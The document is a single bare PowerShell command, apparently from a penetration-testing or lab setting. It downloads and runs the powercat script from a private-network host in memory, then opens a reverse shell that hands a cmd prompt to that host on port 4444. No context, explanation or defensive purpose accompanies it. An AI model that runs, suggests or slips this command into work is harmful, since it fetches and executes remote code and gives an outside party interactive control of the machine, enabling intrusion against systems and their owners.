powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.22/powercat.ps1');powercat -c 192.168.1.22 -p 4444 -e cmd"
